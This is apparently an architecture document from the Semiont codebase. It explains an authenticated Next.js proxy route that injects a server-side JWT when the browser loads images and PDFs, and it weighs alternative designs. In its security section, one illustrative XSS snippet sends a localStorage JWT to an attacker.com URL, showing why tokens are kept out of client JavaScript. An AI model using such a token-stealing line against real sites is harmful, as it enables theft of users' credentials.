# Resource Proxy Architecture

## Overview

The frontend includes an authenticated proxy route at `/api/resources/[id]` that forwards browser requests for images, PDFs, and other resource representations to the backend with proper authentication. This document explains why this proxy is necessary and why the architecture is sound.

## The Problem: Browser Elements Can't Send Auth Headers

HTML elements like `<img>`, `<iframe>`, `<video>`, and `<embed>` **cannot send custom HTTP headers**:

```html
<!-- ❌ This doesn't work - no way to add Authorization header -->
<img src="https://backend.semiont.com/resources/123" />

<!-- ❌ This also doesn't work -->
<img src="https://backend.semiont.com/resources/123"
     headers='{"Authorization": "Bearer xyz"}' />
```

The only headers these elements send are:
- **Cookies** for the domain
- Standard headers (`Accept`, `User-Agent`, `Referer`, etc.)

Since Semiont requires authentication for resource access, browser elements cannot directly load authenticated resources from the backend.

## The Solution: Authenticated Proxy

The frontend proxy route solves this by acting as an authentication bridge:

```
Browser <img src="/api/resources/123">
  ↓ (sends NextAuth session cookie - httpOnly, secure)
Next.js Proxy (/api/resources/[id])
  ↓ (extracts JWT from encrypted session server-side)
  ↓ (adds Authorization: Bearer header)
Backend (/resources/123)
  ↓ (validates JWT)
  ↓ (returns image/PDF/content)
```

### Implementation

**File**: `apps/frontend/src/app/api/resources/[id]/route.ts`

The proxy performs four key functions:

1. **Session validation** (lines 21-25):
   ```typescript
   const session = await getServerSession(authOptions);
   if (!session?.backendToken) {
     return new NextResponse('Unauthorized', { status: 401 });
   }
   ```

2. **Accept header filtering** (lines 32-40):
   ```typescript
   // Strip application/ld+json and application/json
   // Forces backend to return raw representations (images, PDFs, etc.)
   acceptHeader = acceptHeader
     .split(',')
     .filter(type => !type.includes('application/ld+json') && !type.includes('application/json'))
     .join(', ') || '*/*';
   ```

3. **JWT injection** (lines 44-47):
   ```typescript
   const client = new SemiontApiClient({
     baseUrl: backendUrl as BaseUrl,
     accessToken: session.backendToken as AccessToken,
   });
   ```

4. **Streaming proxy** (lines 49-63):
   ```typescript
   const { stream, contentType } = await client.getResourceRepresentationStream(rUri, {
     accept: acceptHeader as ContentFormat,
   });

   return new NextResponse(stream, {
     status: 200,
     headers: {
       'Content-Type': contentType,
       'Cache-Control': 'public, max-age=31536000, immutable',
     },
   });
   ```

## Why This Architecture Makes Sense

### 1. Security: No JWT Exposure

**Problem**: If we exposed the JWT to client-side JavaScript, it would be vulnerable to XSS attacks:

```javascript
// ❌ BAD: JWT accessible to JavaScript
localStorage.setItem('jwt', token);

// Any XSS attack can steal it:
<script>
  fetch('https://attacker.com/steal?jwt=' + localStorage.getItem('jwt'));
</script>
```

**Solution**: The proxy keeps the JWT on the server-side:

- ✅ JWT stored in encrypted NextAuth session (httpOnly cookie)
- ✅ Client-side JavaScript **cannot access** httpOnly cookies
- ✅ XSS attacks **cannot steal** the JWT
- ✅ JWT only exists in server memory during proxy request

### 2. Clean Separation of Concerns

The proxy maintains a clear architectural boundary:

```
┌─────────────────────────────────────┐
│ Frontend (Next.js + NextAuth)       │
│ - Manages encrypted sessions        │
│ - Extracts JWT for API calls        │
│ - Knows about NextAuth internals    │
└─────────────────────────────────────┘
                 ↓ JWT Bearer Token
┌─────────────────────────────────────┐
│ Backend (Hono API)                  │
│ - Only knows about JWT              │
│ - Pure API service                  │
│ - Framework agnostic                │
└─────────────────────────────────────┘
```

**Benefits**:
- Backend doesn't need to know about NextAuth sessions
- Backend only handles standard Bearer token authentication
- Frontend can change session management without touching backend
- Clear responsibility boundaries

### 3. Memory Efficiency: Streaming

The proxy uses streaming to avoid loading entire files into memory:

```typescript
// Get resource as stream (not buffered)
const { stream, contentType } = await client.getResourceRepresentationStream(rUri, {
  accept: acceptHeader as ContentFormat,
});

// Stream directly to client - backend → proxy → browser
return new NextResponse(stream, {
  status: 200,
  headers: { 'Content-Type': contentType },
});
```

This is critical for large files:
- Images (can be several MB)
- PDFs (can be 10s of MB)
- Videos (can be 100s of MB)

Without streaming, each request would load the entire file into Node.js memory before sending to client.

### 4. Standard Pattern

This is a **well-established pattern** in modern web applications:

- Next.js + backend API: Proxy routes for authenticated resources
- React SPA + backend API: Server-side proxy for auth injection
- Any framework + OAuth: Session-to-bearer-token translation layer

It's not a workaround - it's the **correct solution** for authenticated resources in browsers.

## Alternative Approaches (And Why They're Worse)

### ❌ Alternative 1: Make Backend Route Public

```typescript
// Remove authentication from /resources/:id
export function createResourceRouter(): ResourcesRouterType {
  const router = new Hono();
  // No authMiddleware!
  return router;
}
```

**Problems**:
- Anyone can access any resource without authentication
- Massive security hole
- Defeats entire authentication system

### ❌ Alternative 2: Token in URL Query Parameter

```html
<img src="https://backend.semiont.com/resources/123?token=eyJhbGc..." />
```

**Problems**:
- **Exposes JWT in URLs** (browser history, server logs, referrer headers)
- Tokens leaked to any external resources the page links to
- Major security vulnerability
- Visible in browser dev tools

### ⚠️ Alternative 3: Backend Reads Session Cookie

Make backend decrypt NextAuth sessions:

```typescript
// Backend middleware
const sessionCookie = c.req.cookie('next-auth.session-token');
const decoded = await decode({
  token: sessionCookie,
  secret: process.env.NEXTAUTH_SECRET!,
});
```

**Problems**:
- Couples backend to NextAuth implementation
- Backend must install `next-auth` npm package
- Backend must share `NEXTAUTH_SECRET` with frontend
- Backend tests now require NextAuth session encryption
- Loses framework independence
- More complex secret management

**When this would be acceptable**:
- You're committed to Next.js forever (no framework changes)
- Backend and frontend are truly a monolith (deployed together)
- You're willing to maintain NextAuth compatibility in backend

### ⚠️ Alternative 4: Signed URLs

Backend generates time-limited signed URLs:

```typescript
// Frontend requests signed URL
const signedUrl = await fetch('/api/resources/123/signed-url').then(r => r.json());

// Browser loads with signature (no auth needed)
<img src={signedUrl.url} />
// URL: /resources/123?signature=abc123&expires=1234567890
```

**Trade-offs**:
- ✅ No JWT exposure
- ✅ Time-limited access
- ✅ Works with `<img>` tags
- ⚠️ Extra API call to get signed URL
- ⚠️ More complex backend logic
- ⚠️ Requires HMAC secret management

**When this would make sense**:
- Resources need to be shared publicly for limited time
- CDN caching is critical
- Resources are accessed frequently from many IPs

## Current Deployment Architecture

Semiont uses Envoy to route requests on a single origin:

```yaml
# .devcontainer/envoy.yaml
routes:
  # Frontend proxy (handles authentication)
  - match: { prefix: "/api/resources" }
    route: { cluster: frontend }  # → localhost:3000

  # Backend API (requires Bearer token)
  - match: { prefix: "/resources" }
    route: { cluster: backend }   # → localhost:4000
```

**Flow**:
```
Browser → localhost:8080/api/resources/123 (Envoy)
  ↓ (routes to frontend)
Next.js → localhost:3000/api/resources/123
  ↓ (adds auth, calls backend)
Backend → localhost:4000/resources/123
  ↓ (validates JWT, returns content)
```

Even though everything is on the same origin via Envoy, the proxy is still valuable because:
1. **Security**: Keeps JWT extraction server-side
2. **Clean abstraction**: Backend only handles Bearer tokens
3. **Framework independence**: Can swap Next.js without touching backend
4. **Testing simplicity**: Backend tests only need JWTs

## Performance Considerations

### Latency

The proxy adds **one additional network hop**:

- Without proxy: Browser → Backend (1 hop)
- With proxy: Browser → Frontend → Backend (2 hops)

**Mitigation**:
- Envoy routes on localhost (sub-millisecond routing)
- Streaming prevents memory buffering
- Aggressive caching headers (`max-age=31536000, immutable`)

For most resources, the latency overhead is **negligible** compared to the security and architectural benefits.

### Caching

The proxy sets aggressive caching headers:

```typescript
headers: {
  'Cache-Control': 'public, max-age=31536000, immutable',
}
```

**Why this works**:
- Resources are content-addressed (checksum-based storage)
- Once stored, a resource never changes
- If content changes, it gets a new ID
- Browser caches responses for 1 year

This means the proxy only runs **once per resource per client**. Subsequent requests hit the browser cache.

## Testing

The proxy simplifies testing by maintaining clear boundaries:

**Backend tests** (only need JWT):
```typescript
const res = await app.request('/resources/123', {
  headers: { Authorization: `Bearer ${testJWT}` }
});
```

**Frontend tests** (can mock the proxy):
```typescript
// Mock the proxy route in MSW
http.get('/api/resources/:id', () => {
  return HttpResponse.arrayBuffer(mockImageBuffer, {
    headers: { 'Content-Type': 'image/png' }
  });
});
```

Without the proxy, backend tests would need to mock NextAuth session encryption, creating unnecessary coupling.

## Summary

The resource proxy is a **75-line route** that provides:

1. ✅ **Security**: No JWT exposure to client-side JavaScript
2. ✅ **Clean architecture**: Backend stays framework-agnostic
3. ✅ **Memory efficiency**: Streaming for large files
4. ✅ **Standard pattern**: Widely used in modern web apps
5. ✅ **Testing simplicity**: Clear boundaries for isolated tests
6. ✅ **Browser compatibility**: Works with `<img>`, `<iframe>`, etc.

The proxy is not a workaround - it's the **correct architectural solution** for authenticated resources in browser applications.

## Related Documentation

- [Frontend Authentication Architecture](./AUTHENTICATION.md) - Complete authentication system
- [Backend Authentication Guide](../../backend/docs/AUTHENTICATION.md) - Backend JWT validation
- [System Authentication Architecture](../../../docs/AUTHENTICATION.md) - End-to-end auth flows

---

**Last Updated**: 2026-01-21
**Implementation**: `apps/frontend/src/app/api/resources/[id]/route.ts` (69 lines)
